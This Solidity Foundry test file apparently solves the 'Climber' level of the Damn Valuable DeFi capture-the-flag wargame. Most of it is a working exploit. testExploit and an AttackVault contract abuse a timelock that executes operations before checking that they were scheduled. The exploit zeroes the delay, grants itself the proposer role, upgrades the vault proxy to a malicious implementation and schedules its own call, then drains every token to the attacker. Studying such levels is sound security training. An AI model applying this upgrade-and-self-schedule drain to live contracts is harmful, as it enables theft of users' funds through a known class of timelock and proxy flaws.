// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {Initializable} from "openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));
      
 
        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // possible attack vector: call execute with these functions: update delay, schedule operation for withdraw/sweep
        // maybe we need to make ourselves sweeper somehow
        // or somehow acquire admin role
        vm.startPrank(attacker);
        AttackVault av = new AttackVault();
        console.log("ADMIN - ", climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), address(climberTimelock)));
        console.log("AV - ", address(av));
        bytes[] memory data = new bytes[](4);
        data[0] = abi.encodeWithSelector(climberTimelock.updateDelay.selector, 0);
        data[1] = abi.encodeWithSelector(climberTimelock.grantRole.selector, climberTimelock.PROPOSER_ROLE(),address(climberVaultProxy));
        data[2] = abi.encodeWithSelector(climberImplementation.upgradeTo.selector, address(av));
        data[3] = abi.encodeWithSelector(av.sweepFunds.selector, address(dvt),climberVaultProxy, attacker, address(av), climberTimelock,climberImplementation);
       
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        address[] memory addresses = new address[](4);
        addresses[0] = address(climberTimelock);
        addresses[1] = address(climberTimelock);
        addresses[2] = address(climberVaultProxy);
        addresses[3] = address(climberVaultProxy);
        climberTimelock.getOperationId(addresses, values, data, 0x0);
        climberTimelock.execute(addresses,values, data, 0x0);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}


contract AttackVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 public constant WITHDRAWAL_LIMIT = 0;
    uint256 public constant WAITING_PERIOD = 0 days;

    uint256 private _lastWithdrawalTimestamp = 9999999999;
    address private _sweeper;


    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor(
    ) initializer {}

    function initialize(address admin, address proposer, address sweeper) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        _setSweeper(sweeper);
        _setLastWithdrawal(block.timestamp);
        _lastWithdrawalTimestamp = block.timestamp;
    }
    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address tokenAddress, address recipient, uint256 amount) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, amount), "Transfer failed");
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address tokenAddress,  address climberVaultProxy, address recepient, address av, ClimberTimelock climberTimelock, ClimberVault climberImplementation) external {
        bytes[] memory data = new bytes[](4);
        data[0] = abi.encodeWithSelector(climberTimelock.updateDelay.selector, 0);
        data[1] = abi.encodeWithSelector(climberTimelock.grantRole.selector, climberTimelock.PROPOSER_ROLE(),address(climberVaultProxy));
        data[2] = abi.encodeWithSelector(climberImplementation.upgradeTo.selector, av);
        data[3] = abi.encodeWithSelector(this.sweepFunds.selector, tokenAddress,climberVaultProxy, recepient, av,climberTimelock,address(climberImplementation));
       
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        address[] memory addresses = new address[](4);
        addresses[0] = address(climberTimelock);
        addresses[1] = address(climberTimelock);
        addresses[2] = address(climberVaultProxy);
        addresses[3] = address(climberVaultProxy);
         climberTimelock.getOperationId(addresses, values, data, 0x0);
        climberTimelock.schedule(addresses, values, data, 0x0);
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recepient, token.balanceOf(address(this))), "Transfer failed");
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) internal {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _setLastWithdrawal(uint256 timestamp) internal {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
